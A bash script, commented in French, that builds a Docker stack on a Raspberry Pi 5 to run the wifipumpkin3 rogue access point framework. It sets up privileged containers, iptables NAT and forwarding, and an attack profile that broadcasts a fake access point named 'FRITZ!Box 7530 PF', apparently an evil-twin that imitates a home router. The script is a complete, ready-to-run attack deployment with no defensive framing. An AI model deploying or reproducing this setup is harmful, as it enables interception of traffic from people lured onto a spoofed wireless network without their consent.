#!/bin/bash
# Raspberry Pi 5 - Final Corrected Stack (wlan0: MGMT / wlan1: Attack)

# 1. Dockerfile (Correctif URL Git + Bypass compilation PyQt5)
cat <<DOCKER > Dockerfile
FROM debian:bookworm

ENV DEBIAN_FRONTEND=noninteractive
ENV QT_QPA_PLATFORM=offscreen

# Installation des dépendances via APT (Python système unique, pas de conflit)
RUN apt-get update && apt-get install -y \\
    build-essential python3 python3-pip python3-setuptools python3-dev \\
    git hostapd dnsmasq iptables wireless-tools net-tools rfkill \\
    python3-pyqt5 python3-sip python3-openssl python3-scapy \\
    python3-netifaces python3-requests python3-psutil \\
    && rm -rf /var/lib/apt/lists/*

# iw nécessaire pour wifipumpkin3 (vérification mode AP)
RUN apt-get update && apt-get install -y iw && rm -rf /var/lib/apt/lists/*

WORKDIR /opt
# URL corrigée sans espace
RUN git clone https://github.com/P0cL4bs/wifipumpkin3.git /opt/wifipumpkin3

WORKDIR /opt/wifipumpkin3
# Installation wifipumpkin3 + dépendances manquantes (tabulate, etc.)
RUN pip3 install . --break-system-packages

WORKDIR /app
ENTRYPOINT ["wifipumpkin3"]
DOCKER

# 2. Docker Compose (Mode Privilégié pour les cartes réseau)
cat <<COMPOSE > docker-compose.yml
services:
  wifipumpkin3:
    build: .
    container_name: wifipumpkin3
    network_mode: host
    privileged: true
    stdin_open: true
    tty: true
    volumes:
      - .:/app
      - /dev:/dev
      - /lib/modules:/lib/modules
    environment:
      - DISPLAY=:0
      - QT_QPA_PLATFORM=offscreen
    command: ["-p", "/app/attack.pulp"]
    restart: unless-stopped
COMPOSE

# 3. Script d'Initialisation (failsafe wlan0 + NAT wlan1)
cat <<'INIT' > init_attack.sh
#!/bin/bash
# ============================================================
#  init_attack.sh — Lance le fake AP avec failsafe wlan0
# ============================================================

MGMT_IP="192.168.178.65"
ETH0_NET="192.168.178.0/24"

# 1. Vérification management
WLAN0_IP=$(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
ETH0_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "$WLAN0_IP" != "$MGMT_IP" ]; then
    echo "[!!!] ERREUR : wlan0 n'a pas l'IP de management ($MGMT_IP) ! IP actuelle: $WLAN0_IP"
    exit 1
fi
echo "[+] wlan0 OK ($WLAN0_IP) — fallback SSH actif"

if [ -z "$ETH0_IP" ]; then
    echo "[!] ATTENTION : eth0 n'a pas d'IP ! Vérifier le câble."
else
    echo "[+] eth0 OK ($ETH0_IP) — connexion principale"
fi

# 2. iptables : protéger wlan0 + NAT wlan1
echo "[*] Configuration iptables (failsafe wlan0 + NAT wlan1)..."
sudo iptables -C INPUT -i wlan0 -p tcp --dport 22 -j ACCEPT 2>/dev/null || sudo iptables -I INPUT 1 -i wlan0 -p tcp --dport 22 -j ACCEPT
sudo iptables -C INPUT -i eth0 -p tcp --dport 22 -j ACCEPT 2>/dev/null || sudo iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -j ACCEPT
sudo iptables -C INPUT -i wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || sudo iptables -I INPUT 1 -i wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -C FORWARD -i wlan1 -o eth0 -j ACCEPT 2>/dev/null || sudo iptables -I FORWARD 1 -i wlan1 -o eth0 -j ACCEPT
sudo iptables -C FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || sudo iptables -I FORWARD 2 -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -t nat -C POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE 2>/dev/null || sudo iptables -t nat -A POSTROUTING -o eth0 -s 10.0.0.0/8 -j MASQUERADE
sudo iptables -t nat -C POSTROUTING -o wlan0 -s 10.0.0.0/8 -j MASQUERADE 2>/dev/null || sudo iptables -t nat -A POSTROUTING -o wlan0 -s 10.0.0.0/8 -j MASQUERADE
sudo iptables -C FORWARD -i wlan1 -o wlan0 -j ACCEPT 2>/dev/null || sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
sudo iptables -C FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || sudo iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
echo "[+] iptables OK — SSH garanti sur wlan0 + eth0"

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# 3. Préparation wlan1
echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

# 4. Pulp (conserve l'existant si déjà configuré)
if [ ! -f /home/pi/cia/attack.pulp ]; then
    cat <<PULP > attack.pulp
set interface wlan1
set ssid FRITZ!Box 7530 PF
set proxy noproxy
start
PULP
fi

# 5. Lancement Docker
echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build

sleep 8
echo ""
echo "============================================="
echo "  SSH accessible via :"
echo "    ssh pi@$ETH0_IP  (eth0, principal)"
echo "    ssh pi@$WLAN0_IP (wlan0, fallback)"
echo "============================================="
INIT

chmod +x init_attack.sh
./init_attack.sh
